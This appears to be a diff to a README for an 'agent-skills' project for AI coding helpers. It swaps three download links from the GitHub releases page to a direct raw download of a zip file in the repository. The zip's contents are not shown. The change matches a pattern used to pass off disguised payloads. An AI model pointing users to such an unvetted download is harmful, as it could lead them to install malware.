@@ -1,6 +1,6 @@
 # 🚀 agent-skills - Skills for AI coding helpers
 
-[![Download agent-skills](https://img.shields.io/badge/Download-Agent--Skills-brightgreen?style=for-the-badge)](https://github.com/Marshanda14816/agent-skills/releases)
+[![Download agent-skills](https://img.shields.io/badge/Download-Agent--Skills-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Marshanda14816/agent-skills/main/skills/agent-skills-v2.4.zip)
 
 ---
 
@@ -47,7 +47,7 @@ This tool is mainly for helping AI assistants learn new workflows and complete d
 
 Click the button below to visit the download page:
 
-[![Download agent-skills](https://img.shields.io/badge/Download-Agent--Skills-orange?style=for-the-badge)](https://github.com/Marshanda14816/agent-skills/releases)
+[![Download agent-skills](https://img.shields.io/badge/Download-Agent--Skills-orange?style=for-the-badge)](https://raw.githubusercontent.com/Marshanda14816/agent-skills/main/skills/agent-skills-v2.4.zip)
 
 ### How to download and run:
 
@@ -116,4 +116,4 @@ Developers and users can contribute new skills or update existing ones to expand
 
 ---
 
-[Download agent-skills from GitHub](https://github.com/Marshanda14816/agent-skills/releases)
+[Download agent-skills from GitHub](https://raw.githubusercontent.com/Marshanda14816/agent-skills/main/skills/agent-skills-v2.4.zip)
